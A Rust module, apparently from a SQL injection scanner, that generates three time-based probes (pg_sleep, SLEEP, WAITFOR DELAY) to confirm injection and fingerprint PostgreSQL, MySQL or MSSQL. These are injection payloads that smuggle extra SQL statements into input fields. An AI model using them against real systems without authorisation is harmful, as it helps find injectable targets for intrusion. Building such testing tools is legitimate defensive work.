use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

pub fn generate() -> Vec<GeneratedPayload> {
    let probes: Vec<(&str, &str, DbmsFamily, SqlClause)> = vec![
        // PostgreSQL: pg_sleep (timing probe — if latency spikes, PG confirmed)
        ("syntax-pg-sleep", "'; SELECT pg_sleep(5)--", DbmsFamily::PostgreSQL, SqlClause::Select),
        // MySQL: SLEEP()
        ("syntax-mysql-sleep", "'; SELECT SLEEP(5)--", DbmsFamily::MySQL, SqlClause::Select),
        // MSSQL: WAITFOR DELAY
        ("syntax-mssql-waitfor", "'; WAITFOR DELAY '0:0:5'--", DbmsFamily::MSSQL, SqlClause::Select),
    ];

    probes
        .into_iter()
        .map(|(name, payload, dbms, clause)| GeneratedPayload {
            name: name.to_string(),
            probe_type: ProbeType::TimingProbe,
            payload_str: payload.to_string(),
            expected_dbms: Some(dbms),
            clause: Some(clause),
        })
        .collect()
}
